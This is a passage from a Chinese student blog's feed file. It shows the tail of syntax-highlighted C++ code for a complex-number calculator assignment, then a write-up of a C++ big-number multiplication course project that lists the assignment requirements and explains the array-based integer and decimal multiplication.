class="keyword">else</span>&#123;</span><br><span class="line">                cerr&lt;&lt;<span class="string">&quot;异常操作&quot;</span>&lt;&lt;endl;<span class="comment">//此时opstack2为空，opstack1还没有操作</span></span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(mulsave.<span class="built_in">size</span>()==<span class="number">1</span>)&#123;</span><br><span class="line">        result=mulsave.<span class="built_in">back</span>();</span><br><span class="line">        mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ETraslate</span>(buf);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;buf.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isalpha</span>(buf[i])&amp;&amp;buf[i]!=<span class="string">&#x27;i&#x27;</span>)&#123;</span><br><span class="line">            cerr&lt;&lt;<span class="string">&quot;存在非法变量&quot;</span>&lt;&lt;endl;</span><br><span class="line">            Invalid=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对应输出</span></span><br><span class="line">    <span class="keyword">if</span>(Out_State == <span class="number">0</span>)&#123;</span><br><span class="line">        buf=result.<span class="built_in">alldata</span>();</span><br><span class="line">        Out_State=<span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(Out_State == <span class="number">1</span>)&#123;</span><br><span class="line">        buf=result.<span class="built_in">mod</span>();</span><br><span class="line">        Out_State=<span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(Out_State == <span class="number">2</span> )&#123;</span><br><span class="line">        <span class="comment">//buf=result.con();</span></span><br><span class="line">        Out_State=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">NameTraslate</span><span class="params">(string &amp;buf)</span></span>&#123;</span><br><span class="line">    string::const_iterator it = buf.<span class="built_in">begin</span>();</span><br><span class="line">    string::const_iterator word_start;</span><br><span class="line">    string::const_iterator word_end;</span><br><span class="line">    string word;</span><br><span class="line">    <span class="type">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> next_idx=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; it : umap) &#123;</span><br><span class="line">idx=buf.<span class="built_in">find</span>(it.first,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(idx!= std::string::npos)&#123;<span class="comment">//如果不等于，说明找到了</span></span><br><span class="line">            next_idx=idx+it.first.<span class="built_in">length</span>();</span><br><span class="line">            buf.<span class="built_in">replace</span>(idx,it.first.<span class="built_in">length</span>(),it.second);<span class="comment">//用值替换对应对的键</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span>(buf.<span class="built_in">find</span>(<span class="string">&#x27;_&#x27;</span>)!=std::string::npos)&#123;<span class="comment">//如果还找到相对应对的标识符,输出,未定义对的变量.</span></span><br><span class="line">        cerr&lt;&lt;<span class="string">&quot;未定义的变量&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">NameCheck</span><span class="params">(string &amp;buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((buf==<span class="string">&quot;mod&quot;</span>)||(buf==<span class="string">&quot;con&quot;</span>)||(buf==<span class="string">&quot;i&quot;</span>)||(buf==<span class="string">&quot;E&quot;</span>))&#123;</span><br><span class="line">        cerr&lt;&lt;<span class="string">&quot;变量名和关键字方法相同,请重新命名...&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(std::<span class="built_in">isalpha</span>(buf[<span class="number">0</span>])||buf[<span class="number">0</span>]==<span class="string">&#x27;_&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;buf.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(std::<span class="built_in">isalpha</span>(buf[i])||buf[i]==<span class="string">&#x27;_&#x27;</span>||(<span class="string">&#x27;0&#x27;</span>&lt;=buf[i]&amp;&amp;buf[i]&lt;=<span class="string">&#x27;9&#x27;</span>))&#123;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               cerr&lt;&lt;<span class="string">&quot;变量名不符合规范...&quot;</span>&lt;&lt;endl;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        cerr&lt;&lt;<span class="string">&quot;变量名首字符不符合规范...&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ModTraslate</span><span class="params">(string &amp;buf)</span></span>&#123;  <span class="comment">//mod(3+5i)</span></span><br><span class="line">    Complex result=<span class="built_in">Complex</span>();</span><br><span class="line">    <span class="type">int</span> find_idx=buf.<span class="built_in">find</span>(<span class="string">&quot;mod(&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> end_idx=buf.<span class="built_in">find</span>(<span class="string">&quot;)&quot;</span>,find_idx);</span><br><span class="line">    <span class="type">int</span> start_idx=find_idx+<span class="number">4</span>;</span><br><span class="line">    string temp;</span><br><span class="line">    <span class="keyword">if</span>(find_idx!=std::string::npos||end_idx!=std::string::npos)&#123;</span><br><span class="line">        Out_State=<span class="number">1</span>;</span><br><span class="line">        temp=buf.<span class="built_in">substr</span>(start_idx,end_idx-start_idx);</span><br><span class="line">        <span class="built_in">CountEr</span>(temp);</span><br><span class="line">        result=result+temp;</span><br><span class="line">        temp=result.<span class="built_in">mod</span>();</span><br><span class="line">        buf.<span class="built_in">replace</span>(find_idx,end_idx-find_idx+<span class="number">1</span>,temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ConTraslate</span><span class="params">(string &amp;buf)</span></span>&#123;</span><br><span class="line">    Complex result=<span class="built_in">Complex</span>();</span><br><span class="line">    <span class="type">int</span> find_idx=buf.<span class="built_in">find</span>(<span class="string">&quot;con(&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> end_idx=buf.<span class="built_in">find</span>(<span class="string">&quot;)&quot;</span>,find_idx);</span><br><span class="line">    <span class="type">int</span> start_idx=find_idx+<span class="number">4</span>;</span><br><span class="line">    string temp;</span><br><span class="line">    <span class="keyword">if</span>(find_idx!=std::string::npos||end_idx!=std::string::npos)&#123;</span><br><span class="line">        Out_State=<span class="number">2</span>;</span><br><span class="line">        temp=buf.<span class="built_in">substr</span>(start_idx,end_idx-start_idx);</span><br><span class="line">        <span class="built_in">CountEr</span>(temp);</span><br><span class="line">        result=result+temp;</span><br><span class="line">        temp=result.<span class="built_in">con</span>();</span><br><span class="line">        buf.<span class="built_in">replace</span>(find_idx,end_idx-find_idx+<span class="number">1</span>,temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ETraslate</span><span class="params">(string &amp;buf)</span></span>&#123;</span><br><span class="line">    string s=buf;</span><br><span class="line">    <span class="type">int</span> idx_e = s.<span class="built_in">find</span>(<span class="string">&quot;E&quot;</span>);</span><br><span class="line">    <span class="type">int</span> idx_ch =s.<span class="built_in">find</span>(<span class="string">&quot;#&quot;</span>);</span><br><span class="line">    <span class="type">int</span> idx_i=s.<span class="built_in">find</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line">    <span class="type">bool</span> flag_i=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(idx_e!= std::string::npos)&#123;</span><br><span class="line">        <span class="keyword">if</span>(idx_i!=std::string::npos)&#123;</span><br><span class="line">            buf.<span class="built_in">pop_back</span>();<span class="comment">//把i给pop掉</span></span><br><span class="line">            flag_i=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(idx_ch!= std::string::npos)&#123;<span class="comment">//如果存在的话&#123;</span></span><br><span class="line">            buf[idx_ch]=<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        string base = s.<span class="built_in">substr</span>(<span class="number">0</span>, idx_e); <span class="comment">//获取小数部分</span></span><br><span class="line">        <span class="type">int</span> exp = <span class="built_in">stoi</span>(s.<span class="built_in">substr</span>(idx_e + <span class="number">1</span>)); <span class="comment">//获取指数部分</span></span><br><span class="line">        buf=<span class="built_in">AdjustResult</span>(exp,base);</span><br><span class="line">        <span class="keyword">if</span>(flag_i)&#123;</span><br><span class="line">            buf.<span class="built_in">append</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CheckImga</span><span class="params">(string &amp;buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;buf.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BlankFliter</span><span class="params">(string &amp;str)</span><span class="comment">//使用C++string类的方法快速删除空格</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//std::remove_if函数用于将所有空白字符移动到字符串的末尾，</span></span><br><span class="line">    <span class="comment">//然后使用erase函数将它们从字符串中删除。</span></span><br><span class="line">    <span class="comment">//::isspace函数是一个标准库函数，用于检查一个字符是否为空白字符。</span></span><br><span class="line">    str.<span class="built_in">erase</span>(std::<span class="built_in">remove_if</span>(str.<span class="built_in">begin</span>(), str.<span class="built_in">end</span>(), ::isspace), str.<span class="built_in">end</span>()); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WhoFirst</span><span class="params">(<span class="type">char</span> op)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(op==<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="string">&#x27;+&#x27;</span>||op==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="string">&#x27;*&#x27;</span>||op==<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span>(op==<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    cerr&lt;&lt;<span class="string">&quot;错误的字符输入&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">AdjustResult</span><span class="params">(<span class="type">int</span> exp,string &amp;buf)</span></span>&#123;</span><br><span class="line">    string adjust_result;</span><br><span class="line">    <span class="keyword">if</span> (exp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 计算小数点需要向左移动的位数</span></span><br><span class="line">        <span class="type">int</span> move = -exp;</span><br><span class="line">        adjust_result = <span class="string">&quot;0.&quot;</span> + std::<span class="built_in">string</span>(move, <span class="string">&#x27;0&#x27;</span>) + buf;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 在整数部分后面拼接exp个&quot;0&quot;</span></span><br><span class="line">        adjust_result = buf + std::<span class="built_in">string</span>(exp, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> adjust_result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">MpfAdjustResult</span><span class="params">(<span class="type">int</span> exp,string &amp;buf)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> len=buf.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">if</span> (exp &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(len)&#123;</span><br><span class="line">                    <span class="comment">// 计算小数点需要向左移动的位数</span></span><br><span class="line">            <span class="type">int</span> move = -exp;</span><br><span class="line">            buf = <span class="string">&quot;0.&quot;</span> + std::<span class="built_in">string</span>(move, <span class="string">&#x27;0&#x27;</span>) + buf;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(exp&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(len&gt;exp)&#123;<span class="comment">//对于长度大于exp的小数</span></span><br><span class="line">            buf.<span class="built_in">insert</span>(exp,<span class="number">1</span>,<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> buf;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(len==exp)&#123;<span class="comment">//对于小数点刚好在其数字后面的整数</span></span><br><span class="line">            <span class="keyword">return</span> buf;</span><br><span class="line">        &#125;</span><br><span class="line">        exp=exp-len;</span><br><span class="line">        buf = buf + std::<span class="built_in">string</span>(exp, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> buf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 大学课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 作业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++第一次小项目——乘法程序</title>
      <link href="/2024/11/08/C-%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%8F%E9%A1%B9%E7%9B%AE%E2%80%94%E2%80%94%E4%B9%98%E6%B3%95%E7%A8%8B%E5%BA%8F/"/>
      <url>/2024/11/08/C-%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%8F%E9%A1%B9%E7%9B%AE%E2%80%94%E2%80%94%E4%B9%98%E6%B3%95%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="info"><a href="#info" class="headerlink" title=":::info"></a>:::info</h1><p><strong><font style="color:rgb(0,0,0);">课程项目一：乘法程序 </font></strong></p><p><font style="color:rgb(0,0,0);">实现一个可以完成读取两个数并输出两数相乘结果的程序。 </font></p><p><strong><font style="color:rgb(0,0,0);">需求 </font></strong></p><p><font style="color:rgb(0,0,0);">1. </font><font style="color:rgb(0,0,0);">请使用</font><font style="color:rgb(0,0,0);">C++</font><font style="color:rgb(0,0,0);">完成代码，程序需要可以被一个</font><font style="color:rgb(0,0,0);">C++</font><font style="color:rgb(0,0,0);">编译器（如</font><font style="color:rgb(0,0,0);">g++</font><font style="color:rgb(0,0,0);">）编译。程序应该尽可能 </font></p><p><font style="color:rgb(0,0,0);">符合普通人使用计算器完成乘法的直觉。 </font></p><p><font style="color:rgb(0,0,0);">2. </font><font style="color:rgb(0,0,0);">通过以下方式执行代码，程序会打印表达式和结果。两个数需要通过命令行参数进行读 </font></p><p><font style="color:rgb(0,0,0);">取。</font><font style="color:rgb(0,0,0);">(</font><font style="color:rgb(0,0,0);">以下为</font><font style="color:rgb(0,0,0);">linux</font><font style="color:rgb(0,0,0);">环境，如果</font><font style="color:rgb(0,0,0);">windows</font><font style="color:rgb(0,0,0);">环境，虽有小差别（如</font><font style="color:rgb(0,0,0);">mul.exe</font><font style="color:rgb(0,0,0);">，带有拓展名</font><font style="color:rgb(0,0,0);">exe</font><font style="color:rgb(0,0,0);">）， </font></p><p><font style="color:rgb(0,0,0);">但也需要实现类似功能。</font><font style="color:rgb(0,0,0);">) </font></p><p><font style="color:rgb(0,0,0);">$.&#x2F;mul 2 3 </font></p><p><font style="color:rgb(0,0,0);">2 * 3 &#x3D; 6 </font></p><p><font style="color:rgb(0,0,0);">3. </font><font style="color:rgb(0,0,0);">如果输入存在非整数，程序需要尝试把它们转译成浮点数 </font></p><p><font style="color:rgb(0,0,0);">$.&#x2F;mul 3.1416 2 </font></p><p><font style="color:rgb(0,0,0);">3.1416 * 2 &#x3D; 6.2832 </font></p><p><font style="color:rgb(0,0,0);">$.&#x2F;mul 3.1415 2.0e-2 </font></p><p><font style="color:rgb(0,0,0);">3.1415 * 0.02 &#x3D; 0.06283 </font></p><p><font style="color:rgb(0,0,0);">4. </font><font style="color:rgb(0,0,0);">如果当输入不是一个数字时，程序能够说明情况 </font></p><p><font style="color:rgb(0,0,0);">$.&#x2F;mul a * 2 </font></p><p><font style="color:rgb(0,0,0);">输入不能被解析为一个数字！ </font></p><p><font style="color:rgb(0,0,0);">5. </font><font style="color:rgb(0,0,0);">如果你输入的是一些大整数，会发生什么情况？请尝试着描述可能的解决方法，并试着实 </font></p><p><font style="color:rgb(0,0,0);">现它。 </font></p><p><font style="color:rgb(0,0,0);">$.&#x2F;mul 1234567890 987654321 </font><em><font style="color:rgb(0,128,0);"># </font></em><font style="color:rgb(0,128,0);">结果应该是</font><em><font style="color:rgb(0,128,0);"> 1219326311126352690 </font></em></p><p><font style="color:rgb(0,0,0);">6. </font><font style="color:rgb(0,0,0);">如果输入的是大浮点数，会发生什么情况？请尝试着描述可能的解决方法，并试着实现 </font></p><p><font style="color:rgb(0,0,0);">它。 </font></p><p><font style="color:rgb(0,0,0);">$.&#x2F;mul 1.0e200 1.0e200 </font></p><p><font style="color:rgb(0,0,0);">7. </font><font style="color:rgb(0,0,0);">尝试多种方式对代码进行优化，包括执行速度、功能等（提示：搜索高精度乘法等关键 </font></p><p><font style="color:rgb(0,0,0);">词，以及快速傅里叶变换等关键词，尝试支持大数，并提高乘法精度和速度；可以尝试完 </font></p><p><font style="color:rgb(0,0,0);">善错误提示，让错误提示更加明确；尝试允许用户自选输出方式，如是否采用科学计数法 </font></p><p><font style="color:rgb(0,0,0);">等）。</font></p><p><font style="color:rgb(0,0,0);">8. 如果可以，尽量少使用相关代码库，直接调用高精度乘法相关的库无法获得高分。 </font></p><p><font style="color:rgb(0,0,0);">9. </font><font style="color:rgb(0,0,0);">项目报告需要对需求进行分析，描述你的实现方案与项目特色，贴出核心代码并加以解 </font></p><p><font style="color:rgb(0,0,0);">释，若代码编译运行比较复杂，需要附上如何编译运行代码。给出运行结果的展示（如截 </font></p><p><font style="color:rgb(0,0,0);">图），并尽量给出性能展示与分析。最后给出总结。同时，鼓励写上实现代码时遇到的困 </font></p><p><font style="color:rgb(0,0,0);">难以及相应的解决思路</font><font style="color:rgb(0,0,0);">&#x2F;</font><font style="color:rgb(0,0,0);">方案。 </font></p><p><strong><font style="color:rgb(0,0,0);">请注意 </font></strong></p><p><font style="color:rgb(0,0,0);">1. </font><font style="color:rgb(0,0,0);">请在截止日期前提交</font><strong><font style="color:rgb(0,0,0);">项目报告</font></strong><font style="color:rgb(0,0,0);">与</font><strong><font style="color:rgb(0,0,0);">源代码</font></strong><font style="color:rgb(0,0,0);">。提交截止时间是</font><strong><font style="color:rgb(0,0,0);">10</font><strong><strong><font style="color:rgb(0,0,0);">月</font></strong></strong><font style="color:rgb(0,0,0);">15</font><strong><strong><font style="color:rgb(0,0,0);">日</font></strong></strong><font style="color:rgb(0,0,0);">23</font><strong><strong><font style="color:rgb(0,0,0);">：</font></strong></strong><font style="color:rgb(0,0,0);">59</font></strong><font style="color:rgb(0,0,0);">。</font><strong><font style="color:rgb(0,0,0);">超过截止时间 </font></strong></p><p><strong><font style="color:rgb(0,0,0);">的提交将无效</font></strong><font style="color:rgb(0,0,0);">。</font></p><p><font style="color:rgb(0,0,0);">2. </font><font style="color:rgb(0,0,0);">请分开提交项目报告与源代码（即不要放在同个压缩包下）：报告与源代码命名方式为： </font></p><p><font style="color:rgb(0,0,0);">姓名</font><font style="color:rgb(0,0,0);">-</font><font style="color:rgb(0,0,0);">学号</font><font style="color:rgb(0,0,0);">-</font><font style="color:rgb(0,0,0);">项目一，报告为</font><font style="color:rgb(0,0,0);">pdf</font><font style="color:rgb(0,0,0);">，源代码如果单份可以直接发送，如果多份请传</font><font style="color:rgb(0,0,0);">zip</font><font style="color:rgb(0,0,0);">压缩包。 </font></p><p><font style="color:rgb(0,0,0);">3. </font><font style="color:rgb(0,0,0);">分数还将取决于源代码和报告的质量。报告应该容易理解，并很好地描述你的工作，特别 </font></p><p><font style="color:rgb(0,0,0);">是你工作的亮点。 </font></p><p><font style="color:rgb(0,0,0);">4. </font><font style="color:rgb(0,0,0);">请更加注意代码风格。本项目有足够的时间来编写具有正确结果和良好代码风格的代码。 </font></p><p><font style="color:rgb(0,0,0);">如果代码风格很糟糕，可能会被扣分。可以阅读</font><font style="color:rgb(0,0,0);">Google C++</font><font style="color:rgb(0,0,0);">风格指南 </font></p><p><font style="color:rgb(0,0,0);">(</font><font style="color:rgb(85,26,139);"><a href="http://google.github.io/styleguide/cppguide.html">http://google.github.io/styleguide/cppguide.html</a></font><font style="color:rgb(0,0,0);">)或其他一些代码风格指南。</font></p><p>:::</p><h2 id="pqN1u"><font style="color:rgb(0,0,0);">需求1：请使用C++完成代码，程序需要可以被一个C++编译器（如g++）编译。程序应该尽可能 </font></h2><p><strong><font style="color:rgb(0,0,0);">符合普通人使用计算器完成乘法的直觉。</font></strong></p><p>直接 g++ .\project1.cpp -o .\project1.exe编译即可，如何使用？</p><p>我们直接.&#x2F;project1.exe 123 123使用，即可得到123*123的结果</p><hr><h2 id="pZG7D">需求2：打印表达式和结果，通过命令行参数读取，此处用windows执行。</h2><p>执行结果</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697126140616-ba2abbcb-5dd2-4f54-8100-1b1115fc8bbb.png"></p><h3 id="TgGJ4">解析</h3><p>此处是打印表达式用到的东西，此时还用命令行参数，所以存储格式是char，下面会进行转换int</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697126213764-7a8d9fab-ad09-4531-b03d-be6ae91f0e9f.png"></p><p>此处是打印“&#x3D;”与结果，结果存储在一个int类型的数组中，在我们的函数里，为了计算方便，将字符串倒转过来，所以最后打印结果的时候需要逆序打印。</p><p>这里还用一个函数判断是否为浮点数，以判断在什么位置应该打印小数点“.”,其中46为小数点的ASCII码</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697126387502-9a6ad77e-d586-4112-b019-0ccd206353e9.png"></p><p>flag1与flag2判断前面是否需要带负号</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697126427363-6ccbd8c1-5b5c-4cc3-b416-0d208f541f62.png"></p><p>现在我们来讲讲整数乘法部分是如何实现的，我们先看从函数调用看过去，在此之前，有一个char数组转int数组的操作（并且将数组逆转）（<strong>其实转成char数组也可以，但是乘法的算法和int不一样，需要重新设计）</strong></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697127632392-78647f25-c005-4458-92c9-e2ebf4a4b42c.png"></p><p>然后将逆转后的数组(int)传参进函数运算</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697170557276-e009c9a0-038f-47e6-bf64-26af20947547.png"></p><p>注意到len3&#x3D;len1+len2，,之后进行乘法运算，最后减去多余的0，如何理解？</p><p>如25 * 25&#x3D;625，此时len3是4，第一个for循环式运算出来的结果是 ，5260，减去多余的0是526，然后逆序输出成625</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697170583658-4c79ff09-ce33-47c4-acb4-2b89e4905646.png"></p><blockquote><p>如果用局部变量来获取长度可能会有问题,如下。我们用全局来解决</p><p>len_ptr1&#x3D;strlen(ptr1);如果用strlen,如果第一个字符是’\x00’,就会截断,长度为0</p></blockquote><h2 id="cR2cr">需求3：<font style="color:rgb(0,0,0);">如果输入存在非整数，程序需要尝试把它们转译成浮点数</font></h2><p>执行结果，和描述有点差异，比如科学技术法打印出来并没有转换成小数，以及小数点后面的0并没有省去</p><p>以及这里的科学技术法只能用大写E</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697127352046-455ad05e-0540-44f2-942d-5c382d939346.png"></p><h3 id="Y8Svy">科学计数法转换</h3><p>应该是用到了C++这两个库</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697174639917-23b8b98a-3921-4c7a-bd2e-27bb71b22869.png"></p><p>分为两步，一个是科学计数法法转浮点数，另一个是浮点数转成字符数组</p><p>这里在转换的时候遇到困难，搜资料发现有如此简单的方法，便采用，用到了类的东西</p><p>使用find方法找到E的位置，exp是指数部分，base是我们前面的部分</p><p>然后做一个运算</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697174489882-0634a596-2267-48ce-9f6a-987ee77005f2.png"></p><h3 id="UrHR3">小数分析</h3><p>上面提到过，有一个函数判断是否为浮点数，我们的函数如下，就是根据里面有没有”.”进行判断，是的话，返回真，执行我们的浮点数运算函数。这个函数就是看有没有’.’，此时Dotflag传进来的还是char类型的数组</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697127471464-38642af7-3bee-4f4d-b124-b713777c1212.png"></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697126589586-5ddb5db1-e958-4c51-9b72-386bd4b2f110.png"></p><p>那浮点数乘法部分我们如何实现的呢？</p><p>首先我们先看，此处定义了dotflag，来分别存储各个数组小数点的位置，在小数运算中有个特性，就是结果的小数点后几位取决于乘法两个数小数点几位相加的结果。比如1.44&#x3D;1.2*1.2（2&#x3D;1+1）</p><p>所以我们dotflag就是1 2相加。</p><p>此时我们看前面两个for循环，这两个for循环是记住dot对的位置，然后去除dot。</p><p>注意这里判断的时候，由于我们前面逆转操作时有 int(ptr[i]-‘0’)的操作，所以我们不能直接判断它是否为’.’，而是如图</p><p>去掉小数点之后，我们数组就剩数字了，是不是意味着我们可以把它当做整数处理？</p><p>所以后面直接带进整数乘法。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697170915826-3aaffeef-4c36-4940-aac6-5d806fcd27d2.png"></p><p>最后出来，我们要把小数点给插上去，插进去的时候注意len3长度要加1</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697171178393-03539b5f-cd8a-4d48-b610-31a0502a3e10.png"></p><p>最后出来到main函数这里打印，注意这里有三个if同级，后面两个if是因为程序有点bug，临时做的一点修改，我目前找不到这个bug来源于哪里，这后面的两个if大概是这样的：</p><p>因为逆序输出，第一位就是最后一位(len-1)，在科学计数法运算的时候，Float_Mul更改过的mul_result数组最后一位是以0结尾，也看不见小数点，这个问题可能和长度有关。但是呢，我们如果输入小数它又是正常的。</p><p>bug如：0625   修补后0.625</p><p>第三个if单独修补以’.’开头的东西</p><p>大概效果如：.625   修补后0.625</p><p>最后for循环里面，由于我们在Float_Mul插进去的是’.’，int类型值是46，所以我们也要判断如果是46就要换成点。注意这里数组每个值都不会大于10，如果大于10会被前面Big_Mul算法除掉，所以这是安全的。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697171248073-31f6676f-b08e-412f-bc23-f90bb0a6864e.png"></p><h2 id="xWD8I">需求4 检查</h2><p>如图，我们声明了两个int变量来记录dot和E的个数，如果2个及以上就是非法字符，当然这里没法判断输入者可以用.和E结尾，不过程序会运行出一些奇怪的数据。</p><p>还有输入其他的也是非法字符，只让输入0-9 . E e这些</p><p>但是这里在处理科学计数法的时候会有一个问题，后面讲大浮点数的时候会涉及到。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697172808327-b683c24d-b17f-4e64-b145-e24dc81c4a81.png"></p><h2 id="c7QCB">需求5 大整数</h2><p>由于这里的算法是针对大整数的，char类型数组不怕溢出，溢出了可以改改宏定义，所以多大都不怕。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697171670005-1f737062-f23c-4273-aee5-c79090db2dec.png"></p><h2 id="tynrl">需求6 